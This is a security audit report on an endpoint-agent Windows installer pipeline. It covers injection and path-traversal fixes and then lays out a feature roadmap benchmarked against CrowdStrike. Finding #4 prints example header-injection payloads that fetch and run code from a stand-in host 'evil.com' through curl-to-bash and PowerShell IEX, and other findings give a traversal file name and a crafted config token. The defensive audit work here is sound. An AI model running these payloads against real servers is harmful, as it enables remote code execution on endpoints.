# Windows Agent Distribution — Audit Report & Strategic Improvements

**Date**: 2026-02-20
**Scope**: All code changes for Windows agent distribution pipeline across `eguard-agent` and `fe_eguard` repositories
**Files Audited**: 12 files across CI, Go server, PowerShell installer, frontend UI, and package sync

### Re-validation Snapshot (2026-02-20)
- Re-validated code paths in both repos:
  - `eguard-agent`: `.github/workflows/release-agent-windows.yml`
  - `fe_eguard`: `go/agent/server/{agent_install.go,agent_install_win.go,install.ps1}`, `packaging/fetch-agent-packages.sh`, `lib/eg/egcron/task/agent_package_sync.pm`, `html/egappserver/root/src/views/endpoint/{EnrollmentTokens.vue,AgentConfig.vue,agentConfigProfiles.js}`
- Verification commands executed:
  - `cd /home/dimas/fe_eguard/go/agent && go test -v ./server -run TestAgentInstall` ✅
  - `cd /home/dimas/fe_eguard && bash -n packaging/fetch-agent-packages.sh` ✅
  - `cd /home/dimas/fe_eguard && ./scripts/check_agent_package_sync_perl.sh` ✅
- Dependency-unblock history:
  - Downloaded `eguard-perl_1.2.5_all.deb` from `repo.eguard.id`.
  - Initial system install attempt (`sudo dpkg -i ...`) was blocked in this runner (password-required sudo).
  - After eGuard Perl runtime wiring (`PERL5LIB`) and module decoupling polish in `agent_package_sync.pm`, syntax validation now passes via the dedicated helper script.
- Notes:
  - This report now uses explicit file paths for Windows installer findings to avoid ambiguity with `eguard-agent/installer/windows/install.ps1`.
  - Installer service-stop handling has been further hardened: pre-stop `sc.exe` failure-recovery disable now checks `$LASTEXITCODE`, and update aborts if service does not stop within timeout.

---

## Part 1: Audit Findings & Fixes Applied

### CRITICAL Findings (Production Blockers)

#### 1. CI: Wrong Binary Name — `agent-core.exe` vs `eguard-agent.exe`
- **File**: `.github/workflows/release-agent-windows.yml`
- **Severity**: CRITICAL (100% confidence — build always fails)
- **Issue**: Cargo.toml names the crate `agent-core`, so `cargo build` produces `agent-core.exe`. The workflow attempted to copy `eguard-agent.exe` which doesn't exist.
- **Fix Applied**: Changed `cp` to rename: `cp target/.../agent-core.exe artifacts/windows/eguard-agent.exe`
- **Also Added**: `fail_on_unmatched_files: true` to `softprops/action-gh-release` so missing artifacts cause immediate failure instead of a silent empty release.

#### 2. Frontend: Invalid PowerShell Syntax — `irm | iex -Server`
- **Files**: `EnrollmentTokens.vue`, `AgentConfig.vue`
- **Severity**: CRITICAL (100% confidence — generated install command always fails)
- **Issue**: `irm "url" | iex -Server "..." -Token "..."` is invalid PowerShell. `Invoke-Expression` (`iex`) does not accept `-Server` or `-Token` parameters. The generated command fails with a PowerShell parse error on every use.
- **Fix Applied**: Changed to scriptblock pattern:
  ```powershell
  & ([scriptblock]::Create((irm 'url/install.ps1'))) -Server 'server' -Token 'token'
  ```
  This downloads the script, creates a scriptblock, and invokes it with named parameters — the correct PowerShell equivalent of `curl | bash -s --`.

#### 3. Go Server: RPM Content-Type via Catch-All `else`
- **File**: `agent_install.go`
- **Severity**: HIGH (correctness risk on future format additions)
- **Issue**: RPM content-type was set in a catch-all `else` branch. Any new format added to validation but missing from the if-chain would silently get `application/x-rpm` content-type.
- **Fix Applied**: Changed to explicit `else if format == "rpm"`. Unknown formats now retain the `application/octet-stream` default.

#### 4. Template Injection via `X-Forwarded-Host` Header
- **Files**: `agent_install.go`, `agent_install_win.go`
- **Severity**: CRITICAL (remote code execution vector)
- **Issue**: `resolveAgentInstallServer(r)` returns the raw `X-Forwarded-Host` header value when the `EGUARD_AGENT_INSTALL_SERVER` env var is unset. This value is substituted directly into bash/PowerShell script templates:
  ```go
  script = strings.ReplaceAll(script, "{{EGUARD_SERVER}}", resolveAgentInstallServer(r))
  ```
  An attacker controlling `X-Forwarded-Host` (e.g., via a compromised reverse proxy or direct request) could inject:
  - Bash: `"; curl evil.com/payload | bash; "` → code execution on Linux endpoints
  - PowerShell: `"; IEX (irm evil.com/payload); "` → code execution on Windows endpoints
- **Fix Applied**: Added `sanitizeTemplateValue()` function that strips all characters except `[a-zA-Z0-9._:[\]-]` — sufficient for hostnames, IPv4/IPv6 addresses, and port numbers. Applied to both bash and PowerShell script handlers.

#### 5. install.ps1: TOML Config Injection
- **File**: `go/agent/server/install.ps1`
- **Severity**: HIGH (config manipulation)
- **Issue**: Bootstrap config values were written unquoted:
  ```toml
  address = eguard.example.com
  enrollment_token = abc123
  ```
  A crafted token like `abc123\n[malicious]\nkey = value` could inject arbitrary TOML sections into the agent's bootstrap configuration.
- **Fix Applied**: All string values are now TOML-quoted with dangerous characters stripped:
  ```toml
  address = "eguard.example.com"
  enrollment_token = "abc123"
  ```
  Added sanitization: `$SafeToken = $Token -replace '["\r\n\\]', ''`

#### 6. install.ps1: GrpcPort Validation Missing
- **File**: `go/agent/server/install.ps1`
- **Severity**: HIGH (injection vector)
- **Issue**: `$GrpcPort` was used directly in the TOML config with no validation. A non-numeric value could break the agent or inject config.
- **Fix Applied**: Added validation: `$SafeGrpcPort = if ($GrpcPort -match '^\d{1,5}$') { $GrpcPort } else { '50052' }`

#### 7. Package Sync: Path Traversal via Asset Names
- **Files**: `fetch-agent-packages.sh`, `agent_package_sync.pm`
- **Severity**: HIGH (file write to arbitrary paths)
- **Issue**: GitHub release asset names were used directly in file paths without sanitization. A malicious release could name an asset `../../etc/cron.d/backdoor.exe`, causing the download to write outside the package directory.
- **Fix Applied**:
  - Bash: Added `basename` stripping with validation for empty/`.`/`..` results
  - Perl: Added `basename($name)` call with same edge-case checks

### IMPORTANT Findings (Should Fix)

#### 8. install.ps1: `sc.exe` Error Handling Hardened
- **File**: `go/agent/server/install.ps1`
- **Severity**: IMPORTANT
- **Issue**: Service registration/recovery `sc.exe` operations previously lacked explicit exit-code handling, so failures could be missed.
- **Fix Applied**: Added `$LASTEXITCODE` checks for `sc.exe create`, `sc.exe description`, pre-stop `sc.exe failure ... actions=""`, and final `sc.exe failure` (restore recovery policy). Service creation now fails fast; non-fatal configuration steps emit warnings.

#### 9. install.ps1: Service Recovery Race During Binary Replacement
- **File**: `go/agent/server/install.ps1`
- **Severity**: IMPORTANT
- **Issue**: With failure recovery enabled (`restart/5000/...`), stopping the service triggers SCM's auto-restart timer. If the restart fires during binary copy, the service starts with a partial/corrupted binary.
- **Fix Applied**: Disable failure recovery before stopping: `sc.exe failure $ServiceName reset= 0 actions= ""`. Re-enable after binary is in place.

#### 10. install.ps1: Insufficient Service Stop Wait
- **File**: `go/agent/server/install.ps1`
- **Severity**: IMPORTANT
- **Issue**: Fixed 2-second `Start-Sleep` after `Stop-Service`. If the agent takes longer to stop (e.g., flushing buffered telemetry), the binary copy would fail with "file in use" error.
- **Fix Applied**: Replaced with polling loop (up to 30 seconds) that checks service status each second, then aborts update if service is still not stopped.

#### 11. Go Server: Version Parameter Unvalidated
- **File**: `agent_install.go`
- **Severity**: MODERATE
- **Issue**: The `?version=` query parameter had no character or length validation. While not directly exploitable (used only for substring matching against filenames), it could cause unexpected behavior with very long or specially crafted strings.
- **Fix Applied**: Added `isValidVersionString()` check (alphanumeric + `.-_+`, max 64 chars). Returns 400 for invalid values.

#### 12. Go Server: Windows Script Content-Type
- **File**: `agent_install_win.go`
- **Severity**: LOW
- **Issue**: PowerShell script served as `text/plain` instead of `text/x-powershell`, inconsistent with bash handler which uses `text/x-shellscript`.
- **Fix Applied**: Changed to `text/x-powershell`.

#### 13. Frontend: `$env:TEMP` Path Unquoted
- **Files**: `EnrollmentTokens.vue`, `AgentConfig.vue`
- **Severity**: MODERATE
- **Issue**: Generated PowerShell commands used `$env:TEMP\eguard-agent.exe` without quotes. On Windows systems where `TEMP` contains spaces (e.g., `C:\Users\John Doe\AppData\Local\Temp`), the `-OutFile` and `Copy-Item` commands would fail.
- **Fix Applied**: Wrapped in double quotes: `"$env:TEMP\eguard-agent.exe"` — allows variable expansion while handling spaces.

#### 14. Frontend: Token/Server URL Unescaped in PowerShell Strings
- **Files**: `EnrollmentTokens.vue`, `AgentConfig.vue`
- **Severity**: MODERATE
- **Issue**: Server URLs and enrollment tokens were interpolated into double-quoted PowerShell strings (`"${server}"`), allowing unintended variable expansion if values contained `$` characters.
- **Fix Applied**: Switched to single-quoted strings with proper escaping via inline `psEsc()` helper that doubles single quotes.

#### 15. Package Sync: `.exe` Filter Too Broad
- **Files**: `packaging/fetch-agent-packages.sh`, `lib/eg/egcron/task/agent_package_sync.pm`
- **Severity**: MODERATE
- **Issue**: Filter matched ANY `.exe` in release assets. Third-party tools, debug utilities, or other executables could be selected as the agent binary.
- **Fix Applied**:
  - Bash: Restricted download selection to `^eguard-agent.*\.exe$`.
  - Perl: Restricted `.exe` asset selection with `_asset_by_suffix($assets, '.exe', qr/^eguard-agent/)`.
- **Validation Note**: Perl `_find_agent_release()` still uses a broad `\.(?:deb|rpm|exe)$` release-candidate check; the strict name check is enforced at final asset selection time.

#### 16. Package Sync: Version File Write Not Atomic
- **File**: `agent_package_sync.pm`
- **Severity**: MODERATE
- **Issue**: Version marker was written directly to the final path. A crash during write would leave a corrupt marker, causing the sync to skip the release permanently (partial version string would never match).
- **Fix Applied**: Write to `.tmp` file first, then `rename()` atomically.

### Not Fixed (Low Priority / Deferred)

#### 17. CI: `EGUARD_AGENT_VERSION` Environment Variable Not Compiled In
- **File**: `release-agent-windows.yml`
- **Issue**: The env var is set at build time but the agent reads it at runtime via `std::env::var("EGUARD_AGENT_VERSION")`. In production, this env var won't be set, so the version will be unknown.
- **Recommendation**: Either compile the version via `env!("EGUARD_AGENT_VERSION")` in Rust, or use `--cfg` flag, or embed it via `build.rs`. This is a broader issue affecting the Linux build too and should be addressed separately.

#### 18. CI: Zig ASM Artifacts Step Inert for Windows
- **File**: `release-agent-windows.yml`
- **Issue**: `zig build asm-artifacts` produces nothing for Windows targets (build.rs skips when `target_os != "linux"`). The step is a harmless no-op.
- **Recommendation**: Remove or gate with a conditional when the Windows build stabilizes. Not urgent.

#### 19. install.ps1: No Binary Integrity Verification
- **File**: `go/agent/server/install.ps1`
- **Issue**: The downloaded `.exe` is installed as a SYSTEM service with no hash or signature verification. A man-in-the-middle (if TLS is compromised or misconfigured) could serve a malicious binary.
- **Recommendation**: Add a `/api/v1/agent-install/windows-exe/sha256` endpoint that returns the SHA256 hash. The install script would verify: `if ((Get-FileHash $TmpFile).Hash -ne $ExpectedHash) { exit 1 }`. Implementation requires Go server changes.

#### 20. install.ps1: No ACL Restriction on Install/Config Directories
- **File**: `go/agent/server/install.ps1`
- **Issue**: `C:\Program Files\eGuard` and `C:\ProgramData\eguard-agent` are created with default permissions. Non-admin users could potentially read the enrollment token from `bootstrap.conf`.
- **Recommendation**: Set restrictive ACLs:
  ```powershell
  $acl = Get-Acl $ConfigDir
  $acl.SetAccessRuleProtection($true, $false)
  $acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule("SYSTEM","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
  $acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","ContainerInherit,ObjectInherit","None","Allow")))
  Set-Acl $ConfigDir $acl
  ```

#### 21. Package Sync: Perl HTTP::Tiny Buffers Entire Binary in RAM
- **File**: `agent_package_sync.pm`
- **Issue**: `HTTP::Tiny->get()` reads the entire response body into memory. A large binary (50+ MB) could cause memory issues on constrained servers.
- **Recommendation**: Use `HTTP::Tiny->mirror()` or `data_callback` for streaming to disk. Not urgent for current binary sizes (~10-15 MB).

---

## Part 2: Strategic Improvements to Surpass CrowdStrike

CrowdStrike Falcon's key competitive advantages are: kernel-level visibility (via their proprietary Falcon sensor), cloud-native architecture, single lightweight agent, threat intelligence integration, and managed detection & response. Here are opportunities where eGuard can match or surpass them.

### Category A: Agent Distribution & Deployment (Immediate Impact)

#### A1. Code-Signed Windows Binary
- **Gap**: eGuard ships an unsigned `.exe`. Windows SmartScreen blocks unsigned binaries, Enterprise GPO may reject them, and security teams won't deploy unsigned agents.
- **CrowdStrike**: All binaries are EV code-signed with their certificate.
- **Action**: Obtain a Windows EV Code Signing Certificate (~$400/year), integrate `signtool.exe` into the Windows CI workflow:
  ```yaml
  - name: Sign binary
    run: signtool sign /f cert.pfx /p ${{ secrets.CERT_PASSWORD }} /tr http://timestamp.digicert.com /td sha256 artifacts/windows/eguard-agent.exe
  ```
- **Impact**: Eliminates SmartScreen warnings, enables deployment in Enterprise environments, required for kernel driver signing (WHQL).

#### A2. MSI Installer with WiX
- **Gap**: Bare `.exe` distribution requires `sc.exe create` and manual service registration. No uninstall path via Windows Settings, no GPO deployment.
- **CrowdStrike**: Distributes proper MSI packages deployable via SCCM/Intune/GPO.
- **Action**: Create a WiX v5 project in `installer/windows/`. The MSI should handle: binary placement, service registration, bootstrap.conf writing, firewall rules, uninstall cleanup. This enables deployment via:
  - Microsoft Intune (MDM)
  - SCCM/MECM (enterprise deployment)
  - Group Policy (GPO MSI assignment)
  - Silent install: `msiexec /i eguard-agent.msi /qn SERVER=host TOKEN=abc`
- **Impact**: Unlocks enterprise deployment channels that cover 90%+ of Windows endpoint management scenarios.

#### A3. Automated Update Mechanism (Self-Updater)
- **Gap**: No agent self-update capability. Updates require manual reinstall or re-running the install script.
- **CrowdStrike**: Falcon agents auto-update from the cloud with rollback capability.
- **Action**: Implement an update service within the agent:
  1. Agent periodically checks `/api/v1/agent-install/windows-exe?version=latest` with `HEAD` request for ETag/Last-Modified
  2. If newer version available, download to staging directory
  3. Verify binary hash/signature
  4. Use Windows Restart Manager or `MoveFileEx` with `MOVEFILE_DELAY_UNTIL_REBOOT` for atomic replacement
  5. Restart service via SCM
  6. Report update status via gRPC heartbeat
- **Impact**: Eliminates manual update burden, enables rapid response to zero-days.

### Category B: Detection & Visibility (Core Competitive Edge)

#### B1. Windows Kernel Sensor via Minifilter Driver
- **Gap**: eGuard Windows detection relies on ETW (Event Tracing for Windows), which is user-mode and can be tampered with by admin-level malware. ETW has known blind spots (direct syscalls, ETW patching, Provider modification).
- **CrowdStrike**: Uses a kernel-mode driver (csagent.sys) registered as a minifilter for file system, process, registry, and network monitoring. This gives tamper-proof visibility.
- **Action**: Develop a Windows minifilter driver for:
  - Process creation/termination callbacks (`PsSetCreateProcessNotifyRoutineEx2`)
  - Image load notifications (`PsSetLoadImageNotifyRoutine`)
  - File system minifilter (IRP interception for file create/write/rename/delete)
  - Registry callbacks (`CmRegisterCallbackEx`)
  - Object access callbacks for handle monitoring
  - Network filtering via WFP (Windows Filtering Platform) callout driver
- **Note**: Requires WHQL signing ($0 via MS Hardware Dev Center) and careful development (BSOD risk). Start with a minifilter for file monitoring + process callbacks, expand incrementally.
- **Impact**: Provides kernel-level tamper-proof visibility. This is the single most important competitive gap versus CrowdStrike.

#### B2. AMSI Integration for Script-Based Attack Detection
- **Gap**: `platform-windows/src/amsi/` has scanner scaffolding but it's not wired to detection rules. Fileless malware (PowerShell, JScript, VBScript, .NET) runs undetected.
- **CrowdStrike**: Deep integration with AMSI for inline script content scanning.
- **Action**: Wire AMSI scan results into the detection engine:
  1. Register as AMSI provider to receive script content before execution
  2. Feed script content through Sigma/YARA rules for known IOCs
  3. Apply ML-based anomaly scoring on script behavior patterns
  4. Correlate AMSI events with ETW process events for attribution
- **Impact**: Catches fileless malware and living-off-the-land (LOTL) attacks — the top attack vector on Windows.

#### B3. ETW Anti-Tampering
- **Gap**: ETW providers can be disabled by admin-level attackers (`logman stop`, `Set-EtwTraceProvider`, or directly patching `ntdll!EtwEventWrite`).
- **CrowdStrike**: Kernel driver makes tampering detection irrelevant (kernel sees all).
- **Action** (while kernel driver is in development):
  1. Monitor for ETW provider configuration changes (event ID 11, Microsoft-Windows-Diagtrack)
  2. Detect `ntdll.dll` patches (ETW bypass technique) via periodic memory integrity checks
  3. Cross-validate ETW events against `/proc`-equivalent data sources (WMI, performance counters)
  4. Alert on gaps: if process events stop arriving, assume tampering
- **Impact**: Hardens the ETW-based detection path against evasion.

#### B4. Hardware-Backed Attestation
- **Gap**: No hardware trust anchor. Agent identity is based on software certificates that can be cloned.
- **CrowdStrike**: Uses TPM for device attestation (Zero Trust Assessment).
- **Action**: Integrate TPM 2.0 via Windows `tbs.dll` (TPM Base Services):
  1. Generate agent identity key in TPM (non-exportable)
  2. TPM-based attestation during enrollment (prove hardware identity)
  3. Measured boot validation (PCR values verify boot integrity)
  4. Report TPM health status in compliance checks
- **Impact**: Enables hardware-rooted Zero Trust posture assessment.

### Category C: Response & Containment (Operational Advantage)

#### C1. Network Isolation via WFP
- **Gap**: `platform-windows/src/wfp/` has filter scaffolding but isolation is not production-ready. No quick-contain capability.
- **CrowdStrike**: One-click network isolation that allows only C2 (cloud) communication.
- **Action**: Complete the WFP (Windows Filtering Platform) integration:
  1. On isolation command: add WFP filters that PERMIT only traffic to the eGuard server IP and BLOCK all other outbound/inbound
  2. DNS resolution allowed only for the eGuard server hostname
  3. Maintain isolation across reboots via persistent WFP filters
  4. Provide de-isolation via server command or local admin escape hatch
  5. Log all blocked connections for forensic value
- **Impact**: Enables instant containment of compromised endpoints without network-level changes (no VLAN switching, no firewall rules).

#### C2. Live Response / Remote Shell
- **Gap**: No remote investigation capability. Analysts must RDP to endpoints.
- **CrowdStrike**: Real Time Response (RTR) allows running commands, browsing files, pulling memory dumps remotely.
- **Action**: Implement a secure remote command channel:
  1. Server sends command via gRPC stream
  2. Agent executes in isolated session (not admin's desktop)
  3. Results streamed back via gRPC
  4. Commands: `ps`, `dir`, `netstat`, `reg query`, `get-file`, `put-file`, `memdump`
  5. Full audit trail of all remote commands
  6. Granular RBAC: different analysts get different command sets
- **Impact**: Eliminates the need for RDP/VPN during incident response. Analysts can investigate from the console.

#### C3. Automated Remediation Playbooks
- **Gap**: `response/` crate has kill/quarantine/capture but no orchestrated response workflows.
- **CrowdStrike**: Falcon Fusion provides automated response workflows (if-then-else logic).
- **Action**: Build a response orchestration engine:
  1. Define playbooks in YAML: trigger condition → sequence of actions
  2. Actions: kill process, quarantine file, isolate network, capture memory, notify SOC
  3. Conditional logic: severity thresholds, asset criticality, time-of-day gates
  4. Dry-run mode for validation (already have `response_dry_run` flag)
  5. Playbook versioning and audit trail
- **Impact**: Reduces mean-time-to-respond (MTTR) from minutes to seconds for known attack patterns.

### Category D: Intelligence & Analytics (Differentiation)

#### D1. Threat Intelligence Correlation at the Edge
- **Gap**: Detection relies on locally-loaded Sigma/YARA rules. No real-time IOC matching against threat feeds.
- **CrowdStrike**: CrowdStrike Intelligence integrates IOCs from 200+ adversary groups into the sensor.
- **Action**: Build a lightweight IOC matching engine in the agent:
  1. Server pushes IOC bundles (hashes, IPs, domains, mutexes) via gRPC
  2. Agent maintains a bloom filter for O(1) IOC lookup
  3. File hashes, network connections, DNS queries checked against bloom filter
  4. Matches trigger enrichment request to server for full IOC context
  5. Support STIX/TAXII feeds for standards-based intelligence sharing
- **Impact**: Enables real-time correlation with threat intelligence without cloud latency.

#### D2. Behavioral Analytics (Beyond Signatures)
- **Gap**: Detection is primarily rule-based (Sigma rules match known patterns). Novel/unknown attacks are missed.
- **CrowdStrike**: Uses ML-based IOA (Indicators of Attack) for behavioral detection.
- **Action**: Implement behavioral scoring in `detection/`:
  1. Build process behavior profiles (normal vs. anomalous syscall sequences)
  2. Track parent-child process trees for unusual relationships (e.g., `excel.exe` → `cmd.exe` → `powershell.exe`)
  3. Monitor for credential access patterns (LSASS access, SAM registry reads)
  4. Detect lateral movement indicators (remote service creation, WMI execution)
  5. Score events on a risk continuum (0-100) rather than binary match/no-match
- **Impact**: Catches zero-day attacks and novel TTPs that signature-based detection misses.

#### D3. Cross-Endpoint Correlation
- **Gap**: Each agent operates independently. No correlation of events across endpoints.
- **CrowdStrike**: Threat Graph correlates events across all managed endpoints in real-time.
- **Action**: Implement server-side event correlation:
  1. Agents stream enriched events to the server via gRPC
  2. Server maintains a sliding-window event graph
  3. Correlation rules: "if endpoint A has lateral movement AND endpoint B has new service creation within 5 minutes, escalate"
  4. Graph-based anomaly detection: unusual communication patterns between endpoints
  5. Visualize attack chains across the kill chain
- **Impact**: Transforms individual endpoint alerts into attack narratives. This is where EDR becomes XDR.

### Category E: Platform & Operations (Enterprise Readiness)

#### E1. Linux eBPF Parity → Windows ETW Parity
- **Gap**: The Linux agent has deep eBPF-based visibility (syscall tracing, network monitoring, file integrity). The Windows agent's ETW coverage is significantly narrower.
- **CrowdStrike**: Similar detection coverage on both platforms.
- **Action**: Map every eBPF probe in `platform-linux` to an ETW equivalent:
  | Linux (eBPF) | Windows (ETW) |
  |---|---|
  | `tracepoint/syscalls/sys_enter_execve` | Microsoft-Windows-Kernel-Process (Event 1) |
  | `tracepoint/syscalls/sys_enter_openat` | Microsoft-Windows-Kernel-File (Event 10/12) |
  | `kprobe/tcp_connect` | Microsoft-Windows-TCPIP (Event 15) |
  | `tracepoint/sched/sched_process_fork` | Microsoft-Windows-Kernel-Process (Event 1) |
  | `kprobe/security_file_permission` | Microsoft-Windows-Security-Auditing (Event 4663) |
- **Impact**: Ensures consistent detection coverage regardless of endpoint OS.

#### E2. macOS Agent Beyond Stub
- **Gap**: `platform-macos` is a stub (`platform_name() -> "macos"`). No macOS detection.
- **CrowdStrike**: Full macOS support via Endpoint Security Framework (ESF).
- **Action**: Implement macOS detection using Apple's Endpoint Security Framework:
  1. `es_new_client()` for process/file/network event subscription
  2. System Extension (not kernel extension — Apple deprecated kexts)
  3. MDM profile for System Extension approval
  4. Map ESF event types to the same `EventType` enum used by Linux/Windows
- **Impact**: Covers the third major enterprise OS. Many organizations have 10-30% Mac fleet.

#### E3. Multi-Tenant Cloud Console
- **Gap**: Single-tenant server deployment. Each customer runs their own `fe_eguard` instance.
- **CrowdStrike**: Multi-tenant SaaS platform with instant deployment.
- **Action**: Add multi-tenancy to the server:
  1. Tenant isolation at the database level (schema-per-tenant or row-level security)
  2. Tenant-scoped API keys and agent enrollment
  3. Centralized fleet management across tenants (for MSP/MSSP use cases)
  4. Per-tenant policy templates and detection rules
- **Impact**: Enables SaaS delivery model and MSSP partnerships — the fastest growth channel in endpoint security.

#### E4. Integration Ecosystem
- **Gap**: Limited integrations. No SIEM forwarding, no SOAR connectors, no ticketing integrations.
- **CrowdStrike**: 200+ marketplace integrations (Splunk, ServiceNow, Palo Alto, etc.).
- **Action**: Build integration framework:
  1. Syslog/CEF output for SIEM integration (Splunk, QRadar, Sentinel)
  2. Webhook notifications for SOAR platforms (Phantom, XSOAR, Swimlane)
  3. REST API for programmatic access (already partially exists)
  4. Pre-built connectors: ServiceNow (ticketing), Slack/Teams (notifications), Jira (case management)
- **Impact**: Enterprise buyers require SIEM integration as a minimum. This is table-stakes for enterprise sales.

### Category F: Unique Differentiators (Where to Lead, Not Follow)

#### F1. eBPF-Based Detection as a Moat
- **Advantage eGuard has**: Deep eBPF integration with custom probes. CrowdStrike uses a traditional kernel driver on Linux.
- **Why it matters**: eBPF is the future of Linux observability. It's safer (verified by the kernel), more flexible (can be updated without rebooting), and has better performance characteristics.
- **Action**: Double down on eBPF as a differentiator:
  1. Custom eBPF programs for novel attack detection (container escapes, namespace manipulation)
  2. eBPF-based network policy enforcement (replacing iptables)
  3. eBPF CO-RE (Compile Once, Run Everywhere) for kernel version independence
  4. Publish eBPF detection rules as open-source community content
- **Impact**: Positions eGuard as the leader in modern Linux endpoint security. CrowdStrike's legacy kernel module approach is harder to maintain across kernel versions.

#### F2. Compliance-First Design
- **Advantage eGuard has**: Built-in compliance checking (`compliance/` crate) with auto-remediation. CrowdStrike Spotlight does vulnerability management but compliance is an add-on.
- **Action**: Make compliance a first-class feature:
  1. CIS Benchmark automated assessment for Windows/Linux/macOS
  2. Real-time compliance drift detection (not just periodic scans)
  3. Auto-remediation with audit trail (already have the flag)
  4. Compliance dashboard with historical trends
  5. Export compliance reports in standard formats (SCAP, CSV, PDF)
- **Impact**: Combines EDR + Compliance into a single agent, reducing the number of tools customers need.

#### F3. Open Detection Rules
- **Advantage eGuard has**: Uses Sigma rules — an open standard. CrowdStrike's detection logic is proprietary.
- **Action**: Build a community around open detection content:
  1. Publish eGuard's detection rules as open-source Sigma rules
  2. Community marketplace for sharing detection content
  3. Rule testing framework that validates against MITRE ATT&CK
  4. Automatic rule updates from community contributions
- **Impact**: Creates a network effect. More users → more rules → better detection → more users. This is the "Linux model" applied to threat detection.

#### F4. Transparent Architecture
- **Advantage**: Open codebase, auditable detection logic, no black-box ML.
- **CrowdStrike**: Proprietary everything. Customers can't inspect detection logic.
- **Action**: Position transparency as a security feature:
  1. Publish architecture documentation
  2. Provide rule-by-rule detection explanations (why each alert fired)
  3. Allow customers to customize and extend detection rules
  4. Third-party security audit program
- **Impact**: Appeals to security-conscious organizations (government, finance, critical infrastructure) that require auditability.

---

## Summary: Priority Roadmap

| Priority | Item | Effort | Impact |
|----------|------|--------|--------|
| P0 (Now) | Code-sign Windows binary (A1) | 1 day | Unblocks enterprise deployment |
| P0 (Now) | MSI installer with WiX (A2) | 3-5 days | Enables GPO/Intune deployment |
| P1 (Next) | Network isolation via WFP (C1) | 1-2 weeks | Core EDR containment feature |
| P1 (Next) | AMSI integration (B2) | 1 week | Fileless malware detection |
| P1 (Next) | SIEM integration / syslog output (E4) | 3-5 days | Enterprise sales requirement |
| P2 (Quarter) | Minifilter kernel driver (B1) | 1-3 months | Kernel-level tamper-proof visibility |
| P2 (Quarter) | Self-updater (A3) | 1-2 weeks | Eliminates manual update burden |
| P2 (Quarter) | Live response / remote shell (C2) | 2-3 weeks | Operational efficiency |
| P2 (Quarter) | ETW parity with eBPF probes (E1) | 1 month | Consistent cross-platform detection |
| P3 (Year) | Behavioral analytics / ML (D2) | 2-3 months | Catches unknown threats |
| P3 (Year) | Cross-endpoint correlation (D3) | 2-3 months | Transforms EDR into XDR |
| P3 (Year) | macOS agent (E2) | 1-2 months | Third platform coverage |
| P3 (Year) | Multi-tenant SaaS (E3) | 2-3 months | SaaS/MSSP delivery model |

---

## Test Results

Validated on 2026-02-20 with:
- `cd /home/dimas/fe_eguard/go/agent && go test -v ./server -run TestAgentInstall`
- `cd /home/dimas/fe_eguard && bash -n packaging/fetch-agent-packages.sh`
- `cd /home/dimas/fe_eguard && ./scripts/check_agent_package_sync_perl.sh`

Go server test output:
```
=== RUN   TestAgentInstallDebDownloadByVersion
--- PASS: TestAgentInstallDebDownloadByVersion (0.00s)
=== RUN   TestAgentInstallRequiresEnrollmentTokenWhenEnabled
--- PASS: TestAgentInstallRequiresEnrollmentTokenWhenEnabled (0.00s)
=== RUN   TestAgentInstallSelectsNewestPackageWhenVersionMissing
--- PASS: TestAgentInstallSelectsNewestPackageWhenVersionMissing (0.00s)
=== RUN   TestAgentInstallExeDownload
--- PASS: TestAgentInstallExeDownload (0.00s)
=== RUN   TestAgentInstallScriptHandler
--- PASS: TestAgentInstallScriptHandler (0.00s)
PASS
ok   gitlab.com/devaistech77/fe_eguard/go/agent/server	0.065s
```

Constraint observed:
- Raw system-Perl compile (`perl -Ilib -c ...`) is environment-sensitive and may fail without eGuard runtime library wiring.
- Use the helper (`./scripts/check_agent_package_sync_perl.sh`) to apply the required `PERL5LIB` path consistently in CI/local validation.
